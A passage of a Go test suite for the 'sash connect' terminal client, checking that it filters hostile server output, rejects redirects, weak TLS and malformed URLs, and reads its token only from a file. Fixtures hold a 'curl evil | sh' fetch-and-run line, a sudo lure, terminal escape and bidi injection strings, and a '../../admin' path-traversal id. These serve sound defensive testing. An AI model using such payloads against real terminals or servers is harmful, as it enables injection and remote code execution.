package connect

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"testing"
	"time"

	"github.com/afterdarksys/sash/internal/codes"
	"github.com/afterdarksys/sash/internal/wsclient/wstest"
)

// hostile is terminal output a host should not be able to land on the
// workstation: a clipboard write, a title, a status query, a DCS, mouse
// tracking, beside a cursor move and a colour that pass.
const hostile = "out\x1b]52;c;ZXZpbA==\x07\x1b]0;title\x1b\\\x1b[6n\x1bP+q544e\x1b\\\x1b[?1000h\x1b[2;3H\x1b[31mred\x1b[0m"

// The three calls with their exact paths, headers and frames; output is
// filtered, keys go out as pty_input, a window change as pty_resize, the
// end of input as pty_eof, and the host's exit status is sash's.
func TestSessionEndToEnd(t *testing.T) {
	cp := newFakeCP(t)
	con := newFakeCon()
	got := make(chan string, 8)
	cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
		start(ctx, c)
		sendBytes(ctx, c, []byte(hostile[:20]))
		sendBytes(ctx, c, []byte(hostile[20:]))
		sendFrame(ctx, c, `{"type":"pty_future","payload":{"x":1}}`)
		typed, _ := inputUntil(ctx, c, "ls\r")
		got <- typed
		f, _ := readClient(ctx, c)
		got <- f.Type + " " + strings.Join([]string{itoa(f.Rows), itoa(f.Cols)}, "x")
		f, _ = readClient(ctx, c)
		got <- f.Type
		sendFrame(ctx, c, `{"type":"pty_exit","payload":{"session_id":"s1","code":3,"reason":"exited"}}`)
	}
	e := goodEnv(t, cp)
	run := begin(con, e, "web1")
	next := func() string {
		select {
		case s := <-got:
			return s
		case <-time.After(10 * time.Second):
			t.Fatal("the server saw nothing")
			return ""
		}
	}
	if _, err := con.keys.Write([]byte("ls\r")); err != nil {
		t.Fatal(err)
	}
	if typed := next(); typed != "ls\r" {
		t.Errorf("input %q", typed)
	}
	con.rows.Store(50)
	con.cols.Store(132)
	con.sig <- sigResize
	if f := next(); f != "pty_resize 50x132" {
		t.Errorf("resize frame %q", f)
	}
	if err := con.keys.Close(); err != nil {
		t.Fatal(err)
	}
	if f := next(); f != "pty_eof" {
		t.Errorf("end of input frame %q", f)
	}
	res := run.wait(t)
	if res.Code != 3 || res.Signal != nil {
		t.Errorf("result %+v", res)
	}
	out := con.out.String()
	if want := "out\x1b[2;3H\x1b[31mred\x1b[0m"; !strings.HasPrefix(out, want) {
		t.Errorf("screen %q, want it to begin %q", out, want)
	}
	for _, bad := range []string{"\x1b]", "\x1bP", "\x1b[6n", "1000h", "ZXZpbA", "title"} {
		if strings.Contains(out, bad) {
			t.Errorf("screen holds %q: %q", bad, out)
		}
	}
	if errText := con.err.String(); errText != "connect: session on web1 ("+testHostID+")\n" {
		t.Errorf("stderr %q", errText)
	}
	reqs := cp.requests()
	if len(reqs) != 3 {
		t.Fatalf("%d requests", len(reqs))
	}
	if q := reqs[0]; q.Method != "GET" || q.Path != "/api/v1/hosts/resolve" || q.Query != "name=web1" || q.Header.Get("Accept") != "application/json" {
		t.Errorf("resolve: %+v", q)
	}
	if q := reqs[1]; q.Method != "POST" || q.Path != "/api/v1/ws-ticket" || q.Query != "" || q.Body != `{"host_id":"`+testHostID+`","purpose":"terminal:open"}` {
		t.Errorf("ticket: %+v", q)
	}
	q := reqs[2]
	vals, err := url.ParseQuery(q.Query)
	if err != nil {
		t.Fatal(err)
	}
	if q.Path != "/api/v1/systems/terminal/"+testHostID || len(vals) != 4 || vals.Get("ticket") != cp.issued[0] || vals.Get("purpose") != "terminal:open" || vals.Get("rows") != "40" || vals.Get("cols") != "120" {
		t.Errorf("upgrade: %s ?%s", q.Path, q.Query)
	}
	checkClean(t, cp, con)
	// Only the two names are ever read from the environment.
	for _, name := range e.asked {
		if name != "SYSTEMAPI_URL" && name != "SYSTEMAPI_TOKEN_FILE" {
			t.Errorf("the environment was asked for %s", name)
		}
	}
}

func itoa(n int) string { return strconv.Itoa(n) }

// How a session ends: an exit status, an end with a reason, a connection
// that closes with no report, and a frame over the read limit.
func TestSessionEnds(t *testing.T) {
	for _, c := range []struct {
		name     string
		terminal func(ctx context.Context, c *wstest.Conn, r *http.Request)
		code     int
		stderr   string
	}{
		{"exit 0", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0,"reason":"exited"}}`)
		}, 0, ""},
		{"exit 255", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":255,"reason":"exited"}}`)
		}, 255, ""},
		{"ended with a reason", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":-1,"reason":"max_duration","message":"SERVER PROSE"}}`)
		}, 1, "session ended: max_duration: the session reached the longest time a session may last\n"},
		{"ended with an unlisted reason", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":-1,"reason":"client_too_slow"}}`)
		}, 1, "session ended: client_too_slow (not in this sash's list)\n"},
		{"ended with a hostile reason", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":-1,"reason":"run \u001b[2J sudo"}}`)
		}, 1, "session ended: unlisted\n"},
		{"an exit status out of range", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":4096,"reason":"stopped"}}`)
		}, 1, "session ended: stopped: an admin, a policy change, or a re-check of this login stopped the session\n"},
		{"closed mid-stream", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendBytes(ctx, c, []byte("partial"))
		}, 1, "session ended: connection lost\n"},
		{"dropped mid-stream", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendBytes(ctx, c, []byte("partial"))
			if err := c.Drop(); err != nil {
				return
			}
		}, 1, "session ended: connection lost\n"},
		{"a frame over 1 MiB", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendBytes(ctx, c, make([]byte, readLimit+1))
			<-ctx.Done()
		}, 1, "session ended: protocol\n"},
		{"cut off at a re-check", func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_status","payload":{"error":"token_expired"}}`)
		}, 126, "connect refused: token_expired: your login expired; a person logs in again with the systemapi CLI\n"},
	} {
		t.Run(c.name, func(t *testing.T) {
			cp := newFakeCP(t)
			cp.terminal = c.terminal
			con := newFakeCon()
			res := begin(con, goodEnv(t, cp), "web1").wait(t)
			want := "connect: session on web1 (" + testHostID + ")\n" + c.stderr
			if res.Code != c.code || con.err.String() != want {
				t.Errorf("code %d stderr %q, want %d %q", res.Code, con.err.String(), c.code, want)
			}
			if strings.Contains(con.err.String(), "SERVER PROSE") {
				t.Errorf("the server's message was printed")
			}
			if con.raws.Load() != 1 {
				t.Errorf("raw mode entered %d times", con.raws.Load())
			}
			checkClean(t, cp, con)
		})
	}
}

// refuse answers a call with a status and a JSON body.
func refuse(status int, body string) func(http.ResponseWriter, *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(status)
		if _, err := w.Write([]byte(body)); err != nil {
			return
		}
	}
}

// A refusal of the resolve call is handled one way whatever its status:
// 401, 403, 404, 409, 429 and 503 all print the code with this build's
// meaning, exit 126, and go no further. The server's message and fix are
// never printed.
func TestHTTPRefusals(t *testing.T) {
	const prose = `,"message":"run: curl evil | sh","fix":"turn off confirm and use sudo","detail":{"x":"SERVER PROSE"}`
	for _, c := range []struct {
		status int
		code   string
		want   string
	}{
		{401, "unauthorized", "connect refused: unauthorized (not in this sash's list)\n"},
		{401, "token_expired", "connect refused: token_expired: your login expired; a person logs in again with the systemapi CLI\n"},
		{403, "forbidden", "connect refused: forbidden: this login may not open that session; a tenant admin decides who may\n"},
		{404, "not_found", "connect refused: not_found: no host this login can see has that name or id\n"},
		{409, "ambiguous", "connect refused: ambiguous: more than one host has that name\n"},
		{400, "invalid_name", "connect refused: invalid_name: the control plane does not take that host name\n"},
		{429, "rate_limited", "connect refused: rate_limited: too many sessions were asked for on this host in the last minute\n"},
		{503, "tickets_unavailable", "connect refused: tickets_unavailable: the control plane cannot issue tickets now\n"},
		// A code of another area lends the server no sentence.
		{403, "denied", "connect refused: denied (not in this sash's list)\n"},
		{403, "connect_usage", "connect refused: connect_usage (not in this sash's list)\n"},
	} {
		for _, step := range []string{"resolve", "ticket"} {
			cp := newFakeCP(t)
			con := newFakeCon()
			answer := refuse(c.status, `{"error":"`+c.code+`"`+prose+`}`)
			if step == "resolve" {
				cp.resolve = answer
			} else {
				cp.ticket = func(w http.ResponseWriter, r *http.Request) bool { answer(w, r); return true }
			}
			res := begin(con, goodEnv(t, cp), "web1").wait(t)
			if res.Code != 126 || con.err.String() != c.want {
				t.Errorf("%s %d %s: code %d stderr %q", step, c.status, c.code, res.Code, con.err.String())
			}
			wantReqs := 1
			if step == "ticket" {
				wantReqs = 2
			}
			if n := len(cp.requests()); n != wantReqs || cp.upgrades != 0 || con.raws.Load() != 0 {
				t.Errorf("%s %s: %d requests, %d upgrades, raw %d", step, c.code, n, cp.upgrades, con.raws.Load())
			}
			for _, bad := range []string{"curl", "sudo", "turn off", "SERVER PROSE"} {
				if strings.Contains(con.err.String()+con.out.String(), bad) {
					t.Errorf("%s: the server's text %q was printed", c.code, bad)
				}
			}
			checkClean(t, cp, con)
		}
	}
}

// What a hostile server puts where a code goes: terminal sequences, a
// long string, something that is not a string, and the person's own token.
func TestHostileCodes(t *testing.T) {
	for name, c := range map[string]struct{ body, want string }{
		"escape sequence": {`{"error":"evil\u001b[2J"}`, "connect refused: unlisted\n"},
		"osc":             {`{"error":"\u001b]0;pwned\u0007"}`, "connect refused: unlisted\n"},
		"300 bytes":       {`{"error":"` + strings.Repeat("a", 300) + `"}`, "connect refused: unlisted\n"},
		"upper case":      {`{"error":"Run_This"}`, "connect refused: unlisted\n"},
		"a sentence":      {`{"error":"please run sudo"}`, "connect refused: unlisted\n"},
		"empty":           {`{"error":""}`, "connect refused: unlisted\n"},
		"unlisted":        {`{"error":"brand_new_code"}`, "connect refused: brand_new_code (not in this sash's list)\n"},
		"the token":       {`{"error":"` + testToken + `"}`, "connect refused: unlisted\n"},
		"a number":        {`{"error":7}`, "connect: request_failed\n"},
		"no error field":  {`{"message":"go away"}`, "connect: request_failed\n"},
		"not JSON":        {`<html>go away</html>`, "connect: request_failed\n"},
	} {
		cp := newFakeCP(t)
		con := newFakeCon()
		cp.resolve = refuse(403, c.body)
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		wantCode := 126
		if strings.HasPrefix(c.want, "connect: request_failed") {
			wantCode = 1
		}
		if res.Code != wantCode || con.err.String() != c.want {
			t.Errorf("%s: code %d stderr %q", name, res.Code, con.err.String())
		}
		if strings.ContainsAny(con.err.String(), "\x1b\x07") {
			t.Errorf("%s: a control byte was printed", name)
		}
		checkClean(t, cp, con)
	}
	// The same in a pty_status, where the ticket is known too.
	for name, c := range map[string]struct {
		frame func(cp *fakeCP) string
		want  string
	}{
		"escape sequence": {func(*fakeCP) string { return `{"type":"pty_status","payload":{"error":"evil\u001b[2J"}}` }, "connect refused: unlisted\n"},
		"the ticket":      {func(cp *fakeCP) string { return `{"type":"pty_status","payload":{"error":"` + cp.issued[0] + `"}}` }, "connect refused: unlisted\n"},
		"an object":       {func(*fakeCP) string { return `{"type":"pty_status","payload":{"error":{"code":"x"}}}` }, "connect refused: unlisted\n"},
		"listed, with a fix": {func(*fakeCP) string {
			return `{"type":"pty_status","payload":{"error":"agent_offline","fix":"use ssh instead","message":"SERVER PROSE"}}`
		}, "connect refused: agent_offline: the host's agent is not connected to the control plane\n"},
	} {
		cp := newFakeCP(t)
		con := newFakeCon()
		cp.terminal = func(ctx context.Context, c2 *wstest.Conn, r *http.Request) { sendFrame(ctx, c2, c.frame(cp)) }
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if res.Code != 126 || con.err.String() != c.want {
			t.Errorf("pty_status %s: code %d stderr %q", name, res.Code, con.err.String())
		}
		if strings.Contains(con.err.String(), "ssh") || strings.Contains(con.err.String(), "SERVER PROSE") {
			t.Errorf("pty_status %s: the server's text was printed", name)
		}
		checkClean(t, cp, con)
	}
}

// A host name the server chose is printed only when it matches the
// control plane's own hostname rule (HOSTNAME_RE); anything else prints
// the host id alone.
func TestServerHostNameIsEscaped(t *testing.T) {
	alone := "connect: session on " + testHostID + "\n"
	named := func(n string) string { return "connect: session on " + n + " (" + testHostID + ")\n" }
	for name, c := range map[string]struct {
		hostname any
		want     string
	}{
		"a plain name":     {"web1", named("web1")},
		"a dotted name":    {"web-1.eu.example.com", named("web-1.eu.example.com")},
		"one character":    {"w", named("w")},
		"253 bytes":        {strings.Repeat("h", 253), named(strings.Repeat("h", 253))},
		"254 bytes":        {strings.Repeat("h", 254), alone},
		"400 bytes":        {strings.Repeat("h", 400), alone},
		"sash's own words": {"web1 ok. sash: your login expired; run systemapi login --token-file /tmp/t then retry", alone},
		"escape and title": {"web\x1b]0;pwned\x07\x1b[2J", alone},
		"bidi and newline": {"a\xe2\x80\xaeb\nconnect refused: fake\r", alone},
		"a forged escape":  {"<U+001B>", alone},
		"the token":        {"host-" + testToken, alone},
		"an underscore":    {"web_1", alone},
		"a leading dash":   {"-web", alone},
		"a trailing dot":   {"web.", alone},
		"a space":          {"web 1", alone},
		"empty":            {"", alone},
		"not a string":     {map[string]any{"x": 1}, alone},
	} {
		cp := newFakeCP(t)
		cp.hostname = c.hostname
		cp.terminal = func(ctx context.Context, c2 *wstest.Conn, r *http.Request) {
			start(ctx, c2)
			sendFrame(ctx, c2, `{"type":"pty_exit","payload":{"code":0}}`)
		}
		con := newFakeCon()
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if res.Code != 0 || con.err.String() != c.want {
			t.Errorf("%s: code %d stderr %q, want %q", name, res.Code, con.err.String(), c.want)
		}
		checkClean(t, cp, con)
	}
	// A host id that could not stand in a path is not used at all.
	for _, id := range []string{"../../admin", "a/b", "a b", "a%2fb", "", strings.Repeat("a", 129), "a?b"} {
		cp := newFakeCP(t)
		cp.resolve = func(w http.ResponseWriter, r *http.Request) { writeJSON(w, 200, map[string]any{"host_id": id}) }
		con := newFakeCon()
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if res.Code != 1 || con.err.String() != "connect: request_failed\n" || len(cp.requests()) != 1 {
			t.Errorf("host id %q: code %d stderr %q", id, res.Code, con.err.String())
		}
	}
}

// --root asks for terminal:root once. Refused at the ticket, or at the
// terminal, it is never asked again as a weaker purpose.
func TestRootRefusalIsNeverRetriedWeaker(t *testing.T) {
	for name, c := range map[string]struct {
		setup func(cp *fakeCP)
		want  string
	}{
		"ticket: scope_denied": {func(cp *fakeCP) {
			cp.ticket = func(w http.ResponseWriter, r *http.Request) bool {
				writeJSON(w, 403, map[string]string{"error": "scope_denied"})
				return true
			}
		}, "connect refused: scope_denied: this login may not open that session; a tenant admin decides who may\n"},
		"ticket: approval_required": {func(cp *fakeCP) {
			cp.ticket = func(w http.ResponseWriter, r *http.Request) bool {
				writeJSON(w, 409, map[string]string{"error": "approval_required"})
				return true
			}
		}, "connect refused: approval_required: a root session on this host needs an approval; an approver decides\n"},
		"ticket: fresh_expired": {func(cp *fakeCP) {
			cp.ticket = func(w http.ResponseWriter, r *http.Request) bool {
				writeJSON(w, 401, map[string]string{"error": "fresh_expired"})
				return true
			}
		}, "connect refused: fresh_expired: a fresh login lasts 5 minutes; a person makes a new fresh login with the systemapi CLI just before opening a root session\n"},
		"terminal: root_unavailable": {func(cp *fakeCP) {
			cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
				sendFrame(ctx, c, `{"type":"pty_status","payload":{"status":"starting"}}`)
				sendFrame(ctx, c, `{"type":"pty_status","payload":{"error":"root_unavailable"}}`)
			}
		}, "connect refused: root_unavailable: a root session is not available on this host: the host's agent must record it\n"},
		"terminal: recording_unavailable": {func(cp *fakeCP) {
			cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
				sendFrame(ctx, c, `{"type":"pty_status","payload":{"error":"recording_unavailable"}}`)
			}
		}, "connect refused: recording_unavailable: the host cannot record the session, so it was not opened\n"},
	} {
		cp := newFakeCP(t)
		c.setup(cp)
		con := newFakeCon()
		res := begin(con, goodEnv(t, cp), "--root", "web1").wait(t)
		if res.Code != 126 || con.err.String() != c.want {
			t.Errorf("%s: code %d stderr %q", name, res.Code, con.err.String())
		}
		if len(cp.purposes) != 1 || cp.purposes[0] != "terminal:root" || cp.upgrades > 1 {
			t.Errorf("%s: ticket requests %v, upgrades %d", name, cp.purposes, cp.upgrades)
		}
		for _, q := range cp.requests() {
			if strings.Contains(q.Query+q.Body, "terminal:open") || strings.Contains(q.Query, "terminal%3Aopen") {
				t.Errorf("%s: a weaker purpose was sent: %s", name, q.Path)
			}
		}
		checkClean(t, cp, con)
	}
	// And --root that is granted asks for the root purpose at the upgrade.
	cp := newFakeCP(t)
	cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
		start(ctx, c)
		sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0}}`)
	}
	con := newFakeCon()
	if res := begin(con, goodEnv(t, cp), "--root", "web1").wait(t); res.Code != 0 {
		t.Errorf("root session: %+v %q", res, con.err.String())
	}
	if q := cp.requests()[2].Query; !strings.Contains(q, "purpose=terminal%3Aroot") {
		t.Errorf("upgrade query %q", q)
	}
	checkClean(t, cp, con)
}

// A redirect at any of the three steps is never followed: it is
// request_failed, and the second server receives nothing at all.
func TestRedirectIsNeverFollowed(t *testing.T) {
	var hits atomic.Int32
	second := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		writeJSON(w, 200, map[string]any{"host_id": testHostID, "ticket": "stk_fromTheWrongServer"})
	}))
	defer second.Close()
	for _, status := range []int{301, 302, 307, 308} {
		for _, step := range []string{"resolve", "ticket", "upgrade"} {
			cp := newFakeCP(t)
			testRoots.AddCert(second.Certificate())
			redirect := func(w http.ResponseWriter, r *http.Request) {
				http.Redirect(w, r, second.URL+r.URL.RequestURI(), status)
			}
			switch step {
			case "resolve":
				cp.resolve = redirect
			case "ticket":
				cp.ticket = func(w http.ResponseWriter, r *http.Request) bool { redirect(w, r); return true }
			case "upgrade":
				cp.upgrade = func(w http.ResponseWriter, r *http.Request) bool { redirect(w, r); return true }
			}
			con := newFakeCon()
			res := begin(con, goodEnv(t, cp), "web1").wait(t)
			if res.Code != 1 || con.err.String() != "connect: request_failed\n" {
				t.Errorf("%d at %s: code %d stderr %q", status, step, res.Code, con.err.String())
			}
			checkClean(t, cp, con)
		}
	}
	if hits.Load() != 0 {
		t.Errorf("the redirect target received %d requests", hits.Load())
	}
}

// A server that stalls is waited for a bounded time, before the upgrade
// and after it.
func TestStallsAreBounded(t *testing.T) {
	defer func(a, b, c, d time.Duration) {
		httpTimeout, handshakeTimeout, firstFrameTimeout, startTimeout = a, b, c, d
	}(httpTimeout, handshakeTimeout, firstFrameTimeout, startTimeout)
	httpTimeout, handshakeTimeout, firstFrameTimeout, startTimeout = 300*time.Millisecond, 300*time.Millisecond, 300*time.Millisecond, 300*time.Millisecond
	hold := func(r *http.Request) {
		select {
		case <-r.Context().Done():
		case <-time.After(5 * time.Second):
		}
	}
	for name, setup := range map[string]func(cp *fakeCP){
		"resolve": func(cp *fakeCP) { cp.resolve = func(w http.ResponseWriter, r *http.Request) { hold(r) } },
		"ticket": func(cp *fakeCP) {
			cp.ticket = func(w http.ResponseWriter, r *http.Request) bool { hold(r); return true }
		},
		"the upgrade": func(cp *fakeCP) {
			cp.upgrade = func(w http.ResponseWriter, r *http.Request) bool { hold(r); return true }
		},
		"after the upgrade": func(cp *fakeCP) {
			cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) { hold(r) }
		},
		"after starting": func(cp *fakeCP) {
			cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
				sendFrame(ctx, c, `{"type":"pty_status","payload":{"status":"starting"}}`)
				hold(r)
			}
		},
		"a body that never ends": func(cp *fakeCP) {
			cp.resolve = func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(200)
				if f, ok := w.(http.Flusher); ok {
					f.Flush()
				}
				hold(r)
			}
		},
	} {
		cp := newFakeCP(t)
		setup(cp)
		con := newFakeCon()
		begun := time.Now()
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if res.Code != 1 || con.err.String() != "connect: request_failed\n" || time.Since(begun) > 4*time.Second {
			t.Errorf("%s: code %d stderr %q after %v", name, res.Code, con.err.String(), time.Since(begun))
		}
		if con.raws.Load() != 0 {
			t.Errorf("%s: raw mode was entered", name)
		}
		checkClean(t, cp, con)
	}
}

// A server that does not behave as the terminal protocol says is refused
// by what it does: there is nothing to negotiate.
func TestNotSah3(t *testing.T) {
	status := func(code int) func(cp *fakeCP) {
		return func(cp *fakeCP) {
			cp.upgrade = func(w http.ResponseWriter, r *http.Request) bool { w.WriteHeader(code); return true }
		}
	}
	first := func(send func(ctx context.Context, c *wstest.Conn)) func(cp *fakeCP) {
		return func(cp *fakeCP) {
			cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) { send(ctx, c) }
		}
	}
	for name, setup := range map[string]func(cp *fakeCP){
		"upgrade answered 200":   status(200),
		"upgrade answered 401":   status(401),
		"upgrade answered 403":   status(403),
		"upgrade answered 404":   status(404),
		"upgrade answered 500":   status(500),
		"first frame not JSON":   first(func(ctx context.Context, c *wstest.Conn) { sendFrame(ctx, c, "welcome to the shell") }),
		"first frame other type": first(func(ctx context.Context, c *wstest.Conn) { sendFrame(ctx, c, `{"type":"hello","payload":{}}`) }),
		"status with no payload": first(func(ctx context.Context, c *wstest.Conn) { sendFrame(ctx, c, `{"type":"pty_status"}`) }),
		"unknown status": first(func(ctx context.Context, c *wstest.Conn) {
			sendFrame(ctx, c, `{"type":"pty_status","payload":{"status":"ready"}}`)
		}),
		"exit before any status": first(func(ctx context.Context, c *wstest.Conn) {
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0}}`)
		}),
		"binary before started": first(func(ctx context.Context, c *wstest.Conn) { sendBytes(ctx, c, []byte("\x1b]52;c;eA==\x07early")) }),
		"unknown type before started": first(func(ctx context.Context, c *wstest.Conn) {
			sendFrame(ctx, c, `{"type":"pty_status","payload":{"status":"starting"}}`)
			sendFrame(ctx, c, `{"type":"motd","payload":{"text":"hi"}}`)
		}),
		"closed before any frame": first(func(ctx context.Context, c *wstest.Conn) {}),
	} {
		cp := newFakeCP(t)
		setup(cp)
		con := newFakeCon()
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if res.Code != 1 || con.err.String() != "connect: the server does not speak sah/3\n" || con.out.String() != "" || con.raws.Load() != 0 {
			t.Errorf("%s: code %d stderr %q stdout %q", name, res.Code, con.err.String(), con.out.String())
		}
		checkClean(t, cp, con)
	}
}

// TLS: a certificate the roots do not hold, a TLS 1.2 server, and plain
// http are all refused, and the token is sent to none of them.
func TestTLSIsNotNegotiable(t *testing.T) {
	t.Run("unknown certificate", func(t *testing.T) {
		cp := newFakeCP(t)
		testRoots = x509.NewCertPool()
		con := newFakeCon()
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if res.Code != 1 || con.err.String() != "connect: request_failed\n" || len(cp.requests()) != 0 {
			t.Errorf("code %d stderr %q requests %d", res.Code, con.err.String(), len(cp.requests()))
		}
	})
	t.Run("TLS 1.2 server", func(t *testing.T) {
		var hits atomic.Int32
		srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { hits.Add(1) }))
		srv.TLS = &tls.Config{MaxVersion: tls.VersionTLS12}
		srv.StartTLS()
		defer srv.Close()
		testRoots = x509.NewCertPool()
		testRoots.AddCert(srv.Certificate())
		con := newFakeCon()
		e := &env{vars: map[string]string{"SYSTEMAPI_URL": srv.URL, "SYSTEMAPI_TOKEN_FILE": tokenFile(t)}}
		res := begin(con, e, "web1").wait(t)
		if res.Code != 1 || con.err.String() != "connect: request_failed\n" || hits.Load() != 0 {
			t.Errorf("code %d stderr %q hits %d", res.Code, con.err.String(), hits.Load())
		}
	})
	t.Run("the configuration", func(t *testing.T) {
		cfg := tlsConfig("cp.example")
		if cfg.MinVersion != tls.VersionTLS13 || cfg.ServerName != "cp.example" || cfg.MaxVersion != 0 || len(cfg.CipherSuites) != 0 || cfg.VerifyPeerCertificate != nil || cfg.VerifyConnection != nil {
			t.Errorf("%+v", cfg)
		}
		saved := testRoots
		testRoots = nil
		if tlsConfig("x").RootCAs != nil {
			t.Errorf("outside a test the roots are not the system's")
		}
		testRoots = saved
	})
}

// SYSTEMAPI_URL: https, a host, and nothing else. Nothing is sent, and
// the token file is not even opened, for anything else.
func TestURLRule(t *testing.T) {
	var hits atomic.Int32
	plain := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { hits.Add(1) }))
	defer plain.Close()
	for _, raw := range []string{
		"", "   ", plain.URL, "http://cp.example", "ws://cp.example", "wss://cp.example", "ftp://cp.example", "cp.example", "//cp.example",
		"https://", "https://user@cp.example", "https://user:pw@cp.example", "https://cp.example?api_key=x", "https://cp.example/?x=1",
		"https://cp.example?", "https://cp.example#frag", "https://cp.example/base", "https://cp.example/api/v1", "https://cp.example:0",
		"https://cp.example:99999", "https://cp.example:abc", "https:cp.example", "https://cp.example/%2e%2e", "https://cp .example",
	} {
		con := newFakeCon()
		e := &env{vars: map[string]string{"SYSTEMAPI_URL": raw, "SYSTEMAPI_TOKEN_FILE": "/nonexistent/never-opened"}}
		res := begin(con, e, "web1").wait(t)
		if res.Code != 2 || con.err.String() != "connect: invalid SYSTEMAPI_URL\n" {
			t.Errorf("%q: code %d stderr %q", raw, res.Code, con.err.String())
		}
	}
	if hits.Load() != 0 {
		t.Errorf("an http server received %d requests", hits.Load())
	}
	for raw, want := range map[string]string{
		"https://cp.example":       "https://cp.example",
		"https://cp.example/":      "https://cp.example",
		"https://cp.example:8443":  "https://cp.example:8443",
		" https://CP.example:443 ": "https://CP.example:443",
		"https://[::1]:8443/":      "https://[::1]:8443",
	} {
		if u, ok := origin(raw); !ok || u.String() != want {
			t.Errorf("origin(%q) = %v %v", raw, u, ok)
		}
	}
}

// Usage: one host, at most --root before it, and no other flag. A refused
// command line reads nothing and sends nothing.
func TestUsage(t *testing.T) {
	for _, args := range [][]string{
		{}, {"--root"}, {"web1", "--root"}, {"web1", "web2"}, {"--root", "web1", "x"}, {"--root", "--root", "web1"},
		{"--session", "web1"}, {"--plan", "web1"}, {"--needs", "web1"}, {"--lint", "web1"}, {"--record", "web1"}, {"--replay", "web1"},
		{"-c", "web1"}, {"--script", "web1"}, {"--script=x", "web1"}, {"--plan"}, {"-web1"}, {"--token", "x"}, {"--insecure", "web1"},
		{"--root", "-c"}, {"--", "web1"},
	} {
		con := newFakeCon()
		e := &env{vars: map[string]string{}}
		res := begin(con, e, args...).wait(t)
		if res.Code != 2 || con.err.String() != "usage: sash connect [--root] <host>\n" || len(e.asked) != 0 {
			t.Errorf("%q: code %d stderr %q env %v", args, res.Code, con.err.String(), e.asked)
		}
	}
	for _, host := range []string{"web 1", "web/1", "web1;ls", "a@b", "web1:22", strings.Repeat("a", 254), "h\x1b[2J", "caf\xc3\xa9", ""} {
		cp := newFakeCP(t)
		con := newFakeCon()
		res := begin(con, goodEnv(t, cp), host).wait(t)
		want := "connect: invalid host name\n"
		if host == "" {
			want = "connect: invalid host name\n"
		}
		if res.Code != 2 || con.err.String() != want || len(cp.requests()) != 0 {
			t.Errorf("host %q: code %d stderr %q", host, res.Code, con.err.String())
		}
	}
}

// Without a terminal on all three descriptors nothing is read or sent.
func TestNeedsATerminal(t *testing.T) {
	cp := newFakeCP(t)
	con := newFakeCon()
	con.notTerm = true
	e := goodEnv(t, cp)
	res := begin(con, e, "web1").wait(t)
	if res.Code != 2 || con.err.String() != "connect needs a terminal\n" || len(cp.requests()) != 0 || len(e.asked) != 0 {
		t.Errorf("code %d stderr %q requests %d env %v", res.Code, con.err.String(), len(cp.requests()), e.asked)
	}
}

// The token comes from the token file and from nowhere else: with
// SYSTEMAPI_API_KEY set and no token file there is no login, the key's
// name is never asked for, and its value goes nowhere.
func TestTokenIsNeverReadFromTheEnvironment(t *testing.T) {
	const key = "sk_envkey_0123456789abcdefgh"
	cp := newFakeCP(t)
	for name, vars := range map[string]map[string]string{
		"no token file":      {"SYSTEMAPI_URL": cp.srv.URL, "SYSTEMAPI_API_KEY": key, "SYSTEMAPI_TOKEN": key},
		"empty token file":   {"SYSTEMAPI_URL": cp.srv.URL, "SYSTEMAPI_API_KEY": key, "SYSTEMAPI_TOKEN_FILE": ""},
		"relative path":      {"SYSTEMAPI_URL": cp.srv.URL, "SYSTEMAPI_API_KEY": key, "SYSTEMAPI_TOKEN_FILE": "token"},
		"file that is gone":  {"SYSTEMAPI_URL": cp.srv.URL, "SYSTEMAPI_API_KEY": key, "SYSTEMAPI_TOKEN_FILE": "/nonexistent/sash/token"},
		"the key as a path?": {"SYSTEMAPI_URL": cp.srv.URL, "SYSTEMAPI_API_KEY": key, "SYSTEMAPI_TOKEN_FILE": key},
	} {
		con := newFakeCon()
		e := &env{vars: vars}
		res := begin(con, e, "web1").wait(t)
